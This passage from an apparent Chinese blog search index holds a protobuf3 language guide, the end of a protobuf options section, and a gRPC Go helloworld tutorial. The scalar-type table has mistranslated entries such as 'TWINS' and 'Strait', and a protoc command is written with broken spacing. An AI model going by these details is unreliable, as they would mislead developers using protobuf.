）。但是，proto包通常不能生成好的Java包，因为proto包不会以反向域名开头。如果不生成Java代码，则此选项无效。\n\n  ```protobuf\n  option java_package =“com.example.foo”;\n  ```\n  \n- `java_multiple_files` （文件选项）：导致在包级别定义顶级消息，枚举和服务，而不是在.proto文件之后命名的外部类中。\n\n```protobuf\noption java_multiple_files = true;\n```\n\n- `java_outer_classname`（file option）：要生成的最外层Java类（以及文件名）的类名。如果  `.proto`文件中没有指定 `java_outer_classname`，则通过将`.proto`文件名转换为驼峰格式（因此 `foo_bar.proto` 成为`FooBar.java`）来构造类名。如果不生成Java代码，则此选项无效。\n\n```protobuf\n  option java_outer_classname =“Ponycopter”;\n\n```\n\n- `optimize_for`\n\n  （文件选项）：可以设置为`SPEED`，`CODE_SIZE`或`LITE_RUNTIME`。这会以下列方式影响C ++和Java代码生成器（可能还有第三方生成器）：\n\n  - `SPEED`（默认值）：protobuf 编译器将生成用于对消息类型进行序列化，解析和执行其他常见操作的代码。此代码经过高度优化。\n  - `CODE_SIZE`：protobuf 编译器将生成最少的类，并依赖于基于反射的共享代码来实现序列化，解析和各种其他操作。因此生成的代码比使用`SPEED`小得多，但操作会更慢。类仍将实现与`SPEED`模式完全相同的公共API 。此模式在包含非常大数量的`.proto`文件的应用程序中最有用，并且不需要所有文件都非常快速。\n  - `LITE_RUNTIME`：protobuf 编译器将生成仅依赖于“lite”运行时库（`libprotobuf-lite`而不是`libprotobuf`）的类。精简版运行时比整个库小得多（大约小一个数量级），但省略了描述符和反射等特定功能。这对于在移动电话等受限平台上运行的应用程序尤其有用。编译器仍然会像在`SPEED`模式中一样生成所有方法的快速实现。生成的类将仅实现`MessageLite`每种语言的接口，该接口仅提供完整`Message`接口的方法的子集。\n\n  ```protobuf\n  option optimize_for = CODE_SIZE;\n  ```\n  \n- `cc_enable_arenas`（文件选项）：为C ++生成的代码启用[竞技场分配](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Farenas)。\n\n- `objc_class_prefix`（文件选项）：设置Objective-C类前缀，该前缀预先添加到此.proto的所有Objective-C生成的类和枚举中。没有默认值。您应该使用[Apple建议的](https://link.juejin.im?target=https%3A%2F%2Fdeveloper.apple.com%2Flibrary%2Fios%2Fdocumentation%2FCocoa%2FConceptual%2FProgrammingWithObjectiveC%2FConventions%2FConventions.html%23%2F%2Fapple_ref%2Fdoc%2Fuid%2FTP40011210-CH10-SW4) 3-5个大写字符之间的前缀。请注意，Apple保留所有2个字母的前缀。\n\n- `deprecated`（字段选项）：如果设置为`true`，则表示该字段已弃用，新代码不应使用该字段。在大多数语言中，这没有实际效果。在Java中，这成为一个`@Deprecated`注释。将来，其他特定于语言的代码生成器可能会在字段的访问器上生成弃用注释，这将导致在编译尝试使用该字段的代码时发出警告。如果任何人都没有使用该字段，并且您希望阻止新用户使用该字段，请考虑使用保留语句替换字段声明。\n\n  ```protobuf\n  int32 old_field = 6 [deprecated = true];\n  ```\n\n##### 14.1 自定义选项\n\nProtocol Buffers还允许您定义和使用自己的选项。这是大多数人不需要的**高级功能**。如果您确实认为需要创建自己的选项，请参阅[Proto2语言指南](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto.html%23customoptions)以获取详细信息。请注意，创建自定义选项使用的[扩展名](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto.html%23extensions)仅允许用于proto3中的自定义选项。\n\n### 15. 生成您的类\n\n根据实际工作需要，生成以下对应语言的自定义消息类型Java，Python，C ++，Go, Ruby, Objective-C，或C＃的`.proto`文件，你需要运行protobuf 编译器`protoc`上`.proto`。如果尚未安装编译器，请[下载该软件包](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fdownloads.html)并按照自述文件中的说明进行操作。对于Go，您还需要为编译器安装一个特殊的代码生成器插件：您可以在GitHub上的[golang / protobuf](https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fgolang%2Fprotobuf%2F)存储库中找到这个和安装说明。\n\nProtobuf 编译器的调用如下：\n\n```protobuf\nprotoc --proto_path = IMPORT_PATH --cpp_out = DST_DIR --java_out = DST_DIR --python_out = DST_DIR --go_out = DST_DIR --ruby_out = DST_DIR --objc_out = DST_DIR --csharp_out = DST_DIR  path / to / file .proto\n```\n\n- `IMPORT_PATH`指定`.proto`解析`import`指令时在其中查找文件的目录。如果省略，则使用当前目录。可以通过`--proto_path`多次传递选项来指定多个导入目录; 他们将按顺序搜索。 可以用作简短的形式。 `-I=*IMPORT_PATH*``--proto_path`\n\n- 您可以提供一个或多个输出指令：\n\n  - `--cpp_out`生成C ++代码`DST_DIR`。有关更多信息，请参阅[C ++生成的代码参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fcpp-generated)。\n  - `--java_out`生成Java代码`DST_DIR`。请参阅[的Java生成的代码参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fjava-generated)更多。\n  - `--python_out`生成Python代码`DST_DIR`。看到[的Python生成的代码的参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fpython-generated)更多。\n  - `--go_out`生成Go代码`DST_DIR`。有关更多信息，请参阅[Go生成代码参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fgo-generated)。\n  - `--ruby_out`生成Ruby代码`DST_DIR`。Ruby生成的代码参考即将推出！\n  - `--objc_out`生成Objective-C代码`DST_DIR`。有关更多信息，请参阅[Objective-C生成的代码参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fobjective-c-generated)。\n  - `--csharp_out`生成C＃代码`DST_DIR`。有关更多信息，请参阅[C＃生成的代码参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fcsharp-generated)。\n  - `--php_out`生成PHP代码`DST_DIR`。看到[PHP生成的代码的参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fphp-generated)更多。\n\n  为了方便起见，如果DST_DIR结束于`.zip`或.`jar`，编译器会将输出写入具有给定名称的单个ZIP格式存档文件。`.jar`输出还将根据Java JAR规范的要求提供清单文件。请注意，如果输出存档已存在，则会被覆盖; 编译器不够智能，无法将文件添加到现有存档中。\n\n- 您必须提供一个或多个`.proto`文件作为输入。`.proto`可以一次指定多个文件。虽然文件是相对于当前目录命名的，但每个文件必须位于其中一个文件中，`IMPORT_PATH`以便编译器可以确定其规范名称。\n\n\n\n### 16. 参考资料\n\n+ https://juejin.im/post/5bb597c2e51d450e6e03e42d\n+ https://colobu.com/2017/03/16/Protobuf3-language-guide/","tags":["protobuf"],"categories":["计算机基础"]},{"title":"protobuf3语法指南","url":"%2Fp%2F21122343.html","content":"\nProtocol Buffer是Google的语言中立的，平台中立的，可扩展机制的，用于序列化结构化数据 - 对比XML，但更小，更快，更简单。您可以定义数据的结构化，然后可以使用特殊生成的源代码轻松地在各种数据流中使用各种语言编写和读取结构化数据。\n\n<!-- more -->\n\n### 1. 定义消息类型\n\n先来看一个非常简单的例子。假设你想定义一个“搜索请求”的消息格式，每一个请求含有一个查询字符串、你感兴趣的查询结果所在的页数，以及每一页多少条查询结果。可以采用如下的方式来定义消息类型的.proto文件了：\n\n```protobuf\nsyntax = \"proto3\";\n\nmessage SearchRequest {\n  string query = 1;\n  int32 page_number = 2;\n  int32 result_per_page = 3;\n}\n```\n\n- 该文件的第一行指定您正在使用`proto3`语法：如果您不这样做，protobuf 编译器将假定您正在使用[proto2](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto)。这必须是文件的第一个非空的非注释行。\n- 所述`SearchRequest`消息定义指定了三个字段（名称/值对），一个用于要在此类型的消息中包含的每个数据片段。每个字段都有一个名称和类型。\n\n##### 1.1 指定字段类型\n\n在上面的示例中，所有字段都是[标量类型](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23scalar)：两个整数（`page_number`和`result_per_page`）和一个字符串（`query`）。但是，您还可以为字段指定合成类型，包括[枚举](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23enum)和其他消息类型。\n\n\n\n##### 1.2 分配标识号\n\n正如上述文件格式，在消息定义中，每个字段都有唯一的一个**数字标识符**。这些标识符是用来在消息的[二进制格式](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fencoding)中识别各个字段的，一旦开始使用就不能够再改变。注：[1,15]之内的标识号在编码的时候会占用一个字节。[16,2047]之内的标识号则占用2个字节。所以应该为那些频繁出现的消息元素保留 [1,15]之内的标识号。切记：要为将来有可能添加的、频繁出现的标识号预留一些标识号。\n\n最小的标识号可以从1开始，最大到2^29 - 1, or 536,870,911。不可以使用其中的[19000－19999]的标识号， Protobuf协议实现中对这些进行了预留。如果非要在.proto文件中使用这些预留标识号，编译时就会报警。\n\n\n\n##### 1.3 指定字段规则\n\n消息字段可以是以下之一：\n\n- 单数：格式良好的消息可以包含该字段中的零个或一个（但不超过一个）。\n- `repeated`：此字段可以在格式良好的消息中重复任意次数（包括零）。将保留重复值的顺序。在proto3中，`repeated`数字类型的字段默认使用`packed`编码。`packed`您可以在[协议缓冲区编码中](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fencoding.html%23packed)找到有关编码的更多信息。\n\n+ 限定修饰符包含 required\\optional\\repeated\n\n  + Required: 表示是一个必须字段，必须相对于发送方，在发送消息之前必须设置该字段的值，对于接收方，必须能够识别该字段的意思。发送之前没有设置required字段或者无法识别required字段都会引发编解码异常，导致消息被丢弃。\n\n  + Optional：表示是一个可选字段，可选对于发送方，在发送消息时，可以有选择性的设置或者不设置该字段的值。对于接收方，如果能够识别可选字段就进行相应的处理，如果无法识别，则忽略该字段，消息中的其它字段正常处理。---因为optional字段的特性，很多接口在升级版本中都把后来添加的字段都统一的设置为optional字段，这样老的版本无需升级程序也可以正常的与新的软件进行通信，只不过新的字段无法识别而已，因为并不是每个节点都需要新的功能，因此可以做到按需升级和平滑过渡。\n\n  + Repeated：表示该字段可以包含0~N个元素。其特性和optional一样，但是每一次可以包含多个值。可以看作是在传递一个数组的值。\n\n\n\n##### 1.4 添加更多消息类型\n\n可以在单个`.proto`文件中定义多种消息类型。如果要定义多个相关消息，这很有用  \n\n例如，如果要定义与`SearchResponse`消息类型对应的回复消息格式，可以将其添加到相同的消息`.proto`：\n\n```protobuf\nmessage SearchRequest {\n  string query = 1;\n  int32 page_number = 2;\n  int32 result_per_page = 3;\n}\n\nmessage SearchResponse {\n ...\n}\n```\n\n\n\n##### 1.5 添加注释\n\n要为`.proto`文件添加注释，请使用C / C ++ - 样式`//`和`/* ... */`语法。\n\n```protobuf\n/* SearchRequest表示搜索查询，带有分页选项\n *表明响应中包含哪些结果。*/\n\nmessage SearchRequest {\n  string query = 1;\n  int32 page_number = 2; //我们想要哪个页码？\n  int32 result_per_page = 3; //每页返回的结果数。\n}\n```\n\n\n\n##### 1.6 保留字段\n\n如果通过完全删除字段或将其注释来[更新](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23updating)消息类型，则未来用户可以在对类型进行自己的更新时重用字段编号。\n\n如果以后加载相同的旧版本，这可能会导致严重问题`.proto`，包括数据损坏，隐私错误等。确保不会发生这种情况的一种方法是指定已删除字段的字段编号（和/或名称，这也可能导致JSON序列化问题）`reserved`。如果将来的任何用户尝试使用这些字段标识符，协议缓冲编译器将会抱怨。\n\n```protobuf\nmessage Foo {\n  reserved 2, 15, 9 to 11;\n  reserved \"foo\", \"bar\";\n}\n```\n\n请注意，您不能在同一`reserved`语句中混合字段名称和字段编号。\n\n\n\n##### 1.7 你的生成是什么`.proto`？\n\n当您在a上运行[协议缓冲区编译器](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23generating)时`.proto`，编译器会生成您所选语言的代码，您需要使用您在文件中描述的消息类型，包括获取和设置字段值，将消息序列化为输出流，并从输入流解析您的消息。\n\n- 对于**C ++**，编译器会从每个文件生成一个`.h`和一个`.cc`文件`.proto`，并为您文件中描述的每种消息类型提供一个类。\n- 对于**Java**，编译器生成一个`.java`文件，其中包含每种消息类型的类，以及`Builder`用于创建消息类实例的特殊类。\n- **Python**有点不同 - Python编译器生成一个模块，其中包含每个消息类型的静态描述符，`.proto`然后与*元类*一起使用，以在运行时创建必要的Python数据访问类。\n- 对于**Go**，编译器会为`.pb.go`文件中的每种消息类型生成一个类型的文件。\n- 对于**Ruby**，编译器生成一个`.rb`包含消息类型的Ruby模块的文件。\n- 对于**Objective-C**，编译器从每个文件生成一个`pbobjc.h`和一个`pbobjc.m`文件`.proto`，其中包含文件中描述的每种消息类型的类。\n- 对于**C＃**，编译器会`.cs`从每个文件生成一个文件`.proto`，其中包含文件中描述的每种消息类型的类。\n\n您可以按照所选语言的教程（即将推出的proto3版本）了解有关为每种语言使用API的更多信息。有关更多API详细信息，请参阅相关[API参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)（proto3版本即将推出）。\n\n\n\n### 2. 标量值类型\n\n标量消息字段可以具有以下类型之一 - 该表显示`.proto`文件中指定的类型，以及自动生成的类中的相应类型：\n\n| .proto type | notes                                                        | C ++ type | Java type   | Python type [2]  |  Go type         | Ruby type                    | C# type     | PHP type          |\n| ----------- | :----------------------------------------------------------- | --------- | ----------- | ---------------- | ------- | ---------------------------- | ----------- | ----------------- |\n| double      |                                                              | double    | double      | float            | float64 | float                        | double      | float             |\n| float       |                                                              | float     | float       | float            | FLOAT32 | float                        | float       | float             |\n| INT32       | 使用可变长度编码。编码负数的效率低 - 如果您的字段可能有负值，请改用sint32。 | INT32     | INT         | INT              | INT32   | Fixnum or Bignum (as needed) | INT         | Integer           |\n| Int64       | 使用可变长度编码。编码负数的效率低 - 如果您的字段可能有负值，请改用sint64。 | Int64     | long        | int / long [3]   | Int64   | TWINS                        | long        | Integer/string[5] |\n| UINT32      | 使用可变长度编码。                                           | UINT32    | int [1]     | int / long [3]   | UINT32  | Fixnum or Bignum (as needed) | UINT        | Integer           |\n| UINT64      | 使用可变长度编码。                                           | UINT64    | Long [1]    | int / long [3]   | UINT64  | TWINS                        | ULONG       | Integer/string[5] |\n| SINT32      | 使用可变长度编码。签名的int值。这些比常规int32更有效地编码负数。 | INT32     | INT         | INT              | INT32   | Fixnum or Bignum (as needed) | INT         | Integer           |\n| sint64      | 使用可变长度编码。签名的int值。这些比常规int64更有效地编码负数。 | Int64     | long        | int / long [3]   | Int64   | TWINS                        | long        | Integer/string[5] |\n| fixed32     | 总是四个字节。如果值通常大于2 28，则比uint32更有效。         | UINT32    | int [1]     | int / long [3]   | UINT32  | Fixnum or Bignum (as needed) | UINT        | Integer           |\n| fixed64     | 总是八个字节。如果值通常大于2 56，则比uint64更有效。         | UINT64    | Long [1]    | int / long [3]   | UINT64  | TWINS                        | ULONG       | Integer/string[5] |\n| sfixed32    | 总是四个字节。                                               | INT32     | INT         | INT              | INT32   | Fixnum or Bignum (as needed) | INT         | Integer           |\n| sfixed64    | 总是八个字节。                                               | Int64     | long        | int / long [3]   | Int64   | TWINS                        | long        | Integer/string[5] |\n| Boolean     |                                                              | Boolean   | Boolean     | Boolean          | Boolean | TrueClass / FalseClass       | Boolean     | Boolean           |\n| string      | 字符串必须始终包含UTF-8编码或7位ASCII文本。                  | string    | string      | str / unicode[4] | string  | String (UTF-8)               | string      | string            |\n| byte        | 可以包含任意字节序列。                                       | string    | Byte string | Strait           | []byte  | String (ASCII-8BIT)          | Byte string | string            |\n\n\n\n在[协议缓冲区编码中](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fencoding)序列化消息时，您可以找到有关如何编码这些类型的更多信息。\n\n[1]在Java中，无符号的32位和64位整数使用它们的带符号对应表示，最高位只是存储在符号位中。\n\n[2]在所有情况下，将值设置为字段将执行类型检查以确保其有效。\n\n[3] 64位或无符号32位整数在解码时始终表示为long，但如果在设置字段时给出int，则可以为int。在所有情况下，该值必须适合设置时表示的类型。见[2]。\n\n[4] Python字符串在解码时表示为unicode，但如果给出了ASCII字符串，则可以是str（这可能会发生变化）。\n\n[5] Integer用于64位计算机，字符串用于32位计算机。\n\n\n\n### 3. 默认值\n\n解析消息时，如果编码消息不包含特定的单数元素，则解析对象中的相应字段将设置为该字段的默认值。这些默认值是特定于类型的：\n\n- 对于字符串，默认值为空字符串。\n- 对于字节，默认值为空字节。\n- 对于bools，默认值为false。\n- 对于数字类型，默认值为零。\n- 对于[枚举](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23enum)，默认值是第**一个定义的枚举值**，该**值**必须为0。\n- 对于消息字段，未设置该字段。它的确切值取决于语言。有关详细信息， 请参阅[生成的代码指](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)\n\n重复字段的默认值为空（通常是相应语言的空列表）。\n\n请注意，对于标量消息字段，一旦解析了消息，就无法确定字段是否显式设置为默认值（例如，是否设置了布尔值`false`）或者根本没有设置：您应该记住这一点在定义消息类型时。例如，`false`如果您不希望默认情况下也发生这种行为，那么在设置为时，没有一个布尔值可以启用某些行为。还要注意的是，如果一个标消息字段**被**设置为默认值，该值将不会在电线上连载。\n\n有关默认值如何在生成的代码中工作的更多详细信息，请参阅所选语言的[生成代码指南](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)。\n\n### 4. 枚举\n\n在定义消息类型时，您可能希望其中一个字段只有一个预定义的值列表。例如，假设你想添加一个 `corpus`字段每个`SearchRequest`，其中语料库可以 `UNIVERSAL`，`WEB`，`IMAGES`，`LOCAL`，`NEWS`，`PRODUCTS`或`VIDEO`。您可以非常简单地通过`enum`为每个可能的值添加一个常量来定义消息定义。\n\n在下面的示例中，我们添加了一个带有所有可能值的`enum`调用`Corpus`，以及一个类型的字段`Corpus`：\n\n```protobuf\nmessage SearchRequest {\n  string query = 1;\n  int32 page_number = 2;\n  int32 result_per_page = 3;\n  enum Corpus {\n    UNIVERSAL = 0;\n    WEB = 1;\n    IMAGES = 2;\n    LOCAL = 3;\n    NEWS = 4;\n    PRODUCTS = 5;\n    VIDEO = 6;\n  }\n  Corpus corpus = 4;\n}\n```\n\n如您所见，`Corpus`枚举的第一个常量映射为零：每个枚举定义**必须**包含一个映射到零的常量作为其第一个元素。这是因为：\n\n- 必须有一个零值，以便我们可以使用0作为数字[默认值](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23default)。\n- 零值必须是第一个元素，以便与[proto2](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto)语义兼容，其中第一个枚举值始终是默认值。\n\n\n\n您可以通过为不同的枚举常量指定相同的值来定义别名。为此，您需要将`allow_alias`选项设置为`true`，否则协议编译器将在找到别名时生成错误消息。\n\n```protobuf\nenum EnumAllowingAlias {\n  option allow_alias = true;\n  UNKNOWN = 0;\n  STARTED = 1;\n  RUNNING = 1;\n}\nenum EnumNotAllowingAlias {\n  UNKNOWN = 0;\n  STARTED = 1;\n  // RUNNING = 1;  // Uncommenting this line will cause a compile error inside Google and a warning message outside.\n}\n```\n\n枚举器常量必须在32位整数范围内。由于`enum`值在线上使用[varint编码](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fencoding)，因此负值效率低，因此不建议使用。您可以`enum`在消息定义中定义s，如上例所示，`enum`也可以在外部定义 - 这些可以在`.proto`文件的任何消息定义中重用。您还可以使用`enum`语法将一个消息中声明的类型用作另一个消息中的字段类型。 `*MessageType*.*EnumType*`\n\n当你在`.proto`使用a的协议缓冲编译器上运行时`enum`，生成的代码将具有`enum`Java或C ++ 的相应代码，这`EnumDescriptor`是Python的一个特殊类，用于在运行时生成的类中创建一组带有整数值的符号常量。\n\n在反序列化期间，将在消息中保留无法识别的枚举值，但是当反序列化消息时，如何表示这种值取决于语言。在支持具有超出指定符号范围的值的开放枚举类型的语言中，例如C ++和Go，未知的枚举值仅作为其基础整数表示存储。在具有封闭枚举类型（如Java）的语言中，枚举中的大小写用于表示无法识别的值，并且可以使用特殊访问器访问基础整数。在任何一种情况下，如果消息被序列化，则仍然会使用消息序列化无法识别的值。\n\n有关如何`enum`在应用程序中使用消息的详细信息，请参阅所选语言的[生成代码指南](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)。\n\n\n\n##### 4.1 保留值\n\n如果通过完全删除枚举条目或将其注释掉来[更新](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23updating)枚举类型，则未来用户可以在对类型进行自己的更新时重用该数值。如果以后加载相同的旧版本，这可能会导致严重问题`.proto`，包括数据损坏，隐私错误等。确保不会发生这种情况的一种方法是指定已删除条目的数值（和/或名称，这也可能导致JSON序列化问题）`reserved`。如果将来的任何用户尝试使用这些标识符，协议缓冲编译器将会抱怨。您可以使用`max`关键字指定保留的数值范围达到最大可能值。\n\n```protobuf\nenum Foo {\n  reserved 2, 15, 9 to 11, 40 to max;\n  reserved \"FOO\", \"BAR\";\n}\n```\n\n请注意，您不能在同一`reserved`语句中混合字段名称和数值。\n\n\n\n### 5. 使用其他消息类型\n\n您可以使用其他消息类型作为字段类型。例如，假设你想包括`Result`每个消息的`SearchResponse`消息-要做到这一点，你可以定义一个`Result`在同一个消息类型`.proto`，然后指定类型的字段`Result`中`SearchResponse`：\n\n```protobuf\nmessage SearchResponse {\n  repeated Result results = 1;\n}\n\nmessage Result {\n  string url = 1;\n  string title = 2;\n  repeated string snippets = 3;\n}\n```\n\n\n\n##### 5.1 导入定义\n\n在上面的示例中，`Result`消息类型在同一文件中定义`SearchResponse`- 如果要用作字段类型的消息类型已在另一个`.proto`文件中定义，该怎么办？\n\n您可以`.proto`通过*导入*来使用其他文件中的定义。要导入其他`.proto`人的定义，请在文件顶部添加import语句：\n\n```protobuf\nimport \"myproject/other_protos.proto\";\n```\n\n默认情况下，您只能使用直接导入`.proto`文件中的定义。但是，有时您可能需要将`.proto`文件移动到新位置。`.proto`现在，您可以`.proto`在旧位置放置一个虚拟文件，以使用该`import public`概念将所有导入转发到新位置，而不是直接移动文件并在一次更改中更新所有调用站点。`import public`任何导入包含该`import public`语句的proto的人都可以传递依赖关系。例如：\n\n```protobuf\n// new.proto\n// All definitions are moved here\n\n// old.proto\n//This is the proto that all clients are importing.\nimport public“new.proto”;\nimport“other.proto”;\n\n// client.proto\nimport \"old.proto\";\n//您使用old.proto和new.proto中的定义，但不使用other.proto\n```\n\n协议编译器使用`-I`/ `--proto_path`flag 在协议编译器命令行中指定的一组目录中搜索导入的文件 。如果没有给出标志，它将查找调用编译器的目录。通常，您应该将`--proto_path`标志设置为项目的根目录，并对所有导入使用完全限定名称。\n\n##### 5.2 使用proto2消息类型\n\n可以导入[proto2](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto)消息类型并在proto3消息中使用它们，反之亦然。但是，proto2枚举不能直接用于proto3语法（如果导入的proto2消息使用它们就可以了）。\n\n\n\n### 6. 嵌套类型\n\n您可以在其他消息类型中定义和使用消息类型，如下例所示 - 此处`Result`消息在消息中定义`SearchResponse`：\n\n```protobuf\nmessage SearchResponse {\n  message Result {\n    string url = 1;\n    string title = 2;\n    repeated string snippets = 3;\n  }\n  repeated Result results = 1;\n}\n```\n\n如果要在其父消息类型之外重用此消息类型，请将其称为： `*Parent*.*Type*`\n\n```protobuf\nmessage SomeOtherMessage {\n  SearchResponse.Result result = 1;\n}\n```\n\n您可以根据需要深入嵌套消息：\n\n```protobuf\nmessage Outer {       // Level 0\n  message MiddleAA {  // Level 1\n    message Inner {   // Level 2\n      int64 ival = 1;\n      bool  booly = 2;\n    }\n  }\n  message MiddleBB {  // Level 1\n    message Inner {   // Level 2\n      int32 ival = 1;\n      bool  booly = 2;\n    }\n  }\n}\n```\n\n\n","tags":["protobuf"],"categories":["计算机基础"]},{"title":"grpc的实战","url":"%2Fp%2Fc0435795.html","content":"\n# 1. 安装\n\n### 1. 1 下载protoc 生成器\n\n通过proto文件，生成相关代码。下载地址：https://github.com/protocolbuffers/protobuf/releases\n\n例如我下载的是 [protoc-3.9.0-osx-x86_64.zip](https://github.com/protocolbuffers/protobuf/releases/download/v3.9.0/protoc-3.9.0-osx-x86_64.zip)\n\n```bash\ncd protoc-3.9.0-osx-x86_64 \ncp -r include/ /usr/local/include/ \ncp -r bin/ /usr/local/bin/\nprotoc --version\n```\n\n<!-- more -->\n\n# 2. 使用\n\nhelloworld.proto 文件如下\n\n```protobuf\nsyntax = \"proto3\";\n\noption java_multiple_files = true;\noption java_package = \"io.grpc.examples.helloworld\";\noption java_outer_classname = \"HelloWorldProto\";\n\npackage helloworld;\n\n// The greeting service definition.\nservice Greeter {\n  // Sends a greeting\n  rpc SayHello (HelloRequest) returns (HelloReply) {}\n}\n\n// The request message containing the user's name.\nmessage HelloRequest {\n  string name = 1;\n}\n\n// The response message containing the greetings\nmessage HelloReply {\n  string message = 1;\n}\n```\n\n### 2.1 golang\n\n```bash\ngo get -u google.golang.org/grpc\ngo get -u github.com/golang/protobuf/protoc-gen-go\n```\n\n我们去 `$GOPATH/src/google.golang.org/grpc/examples` 看helloworld例子\n\n```bash\ncd $GOPATH/src/google.golang.org/grpc/examples/helloworld\n```\n\n我们通过.proto文件生成golang文件, 生成后的文件不要编辑。\n\n```sh\nprotoc -I helloworld/ helloworld/helloworld.proto --go_out=plugins=grpc:helloworld\n\n# 获取进入到helloworld目录里\nprotoc helloworld.proto --go_out=plugins=grpc:. \n```\n\n运行后生成了 helloworld.pb.go\n\n##### client 和 server 调用\n\n我们看下`greeter_server` 的代码并且启动: `go run greeter_server/main.go`\n\n```go\npackage main\n\nimport (\n\t\"context\"\n\t\"log\"\n\t\"net\"\n\n\t\"google.golang.org/grpc\"\n\tpb \"google.golang.org/grpc/examples/helloworld/helloworld\"\n)\n\nconst (\n\tport = \":50051\"\n)\n\n// server is used to implement helloworld.GreeterServer.\ntype server struct{}\n\n// SayHello implements helloworld.GreeterServer\nfunc (s *server) SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, error) {\n\tlog.Printf(\"Received: %v\", in.Name)\n\treturn &pb.HelloReply{Message: \"Hello \" + in.Name}, nil\n}\n\nfunc main() {\n\tlis, err := net.Listen(\"tcp\", port)\n\tif err != nil {\n\t\tlog.Fatalf(\"failed to listen: %v\", err)\n\t}\n\ts := grpc.NewServer()\n\tpb.RegisterGreeterServer(s, &server{})\n\tif err := s.Serve(lis); err != nil {\n\t\tlog.Fatalf(\"failed to serve: %v\", err)\n\t}\n}\n```\n\n\n\n我们看下`greeter_client`的代码并且启动:` go run greeter_client/main.go`\n\n```go\npackage main\n\nimport (\n\t\"context\"\n\t\"log\"\n\t\"os\"\n\t\"time\"\n\n\t\"google.golang.org/grpc\"\n\tpb \"google.golang.org/grpc/examples/helloworld/helloworld\"\n)\n\nconst (\n\taddress     = \"localhost:50051\"\n\tdefaultName = \"world\"\n)\n\nfunc main() {\n\t// Set up a connection to the server.\n\tconn, err := grpc.Dial(address, grpc.WithInsecure())\n\tif err != nil {\n\t\tlog.Fatalf(\"did not connect: %v\", err)\n\t}\n\tdefer conn.Close()\n\tc := pb.NewGreeterClient(conn)\n\n\t// Contact the server and print out its response.\n\tname := defaultName\n\tif len(os.Args) > 1 {\n\t\tname = os.Args[1]\n\t}\n\tctx, cancel := context.WithTimeout(context.Background(), time.Second)\n\tdefer cancel()\n\tr, err := c.SayHello(ctx, &pb.HelloRequest{Name: name})\n\tif err != nil {\n\t\tlog.Fatalf(\"could not greet: %v\", err)\n\t}\n\tlog.Printf(\"Greeting: %s\", r.Message)\n}\n```\n\n\n\nIf things go smoothly, you will see the `Greeting: Hello world` in the client side output.\n\nCongratulations! You’ve just run a client-server application with gRPC.\n\n\n\n##### 增加新的方法实现\n\n1. 在proto文件里增加 `rpc SayHelloAgain (HelloRequest) returns (HelloReply) {}`的定义\n2. 通过protoc重新生成golang文件, 生成的文件里增加了SayHelloAgain相关方法。\n\n\n\n1. 修改server文件增加方法来实现接口\n\n```go\nfunc (s *server) SayHelloAgain(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, error) {\n        return &pb.HelloReply{Message: \"Hello again \" + in.Name}, nil\n}\n```\n\n2. 修改client方法增加调用\n\n```go\nr, err = c.SayHelloAgain(ctx, &pb.HelloRequest{Name: name})\nif err != nil {\n        log.Fatalf(\"could not greet: %v\", err)\n}\nlog.Printf(\"Greeting: %s\", r.Message)\n```\n\n### 2.2 cpp 版本\n\n参考: 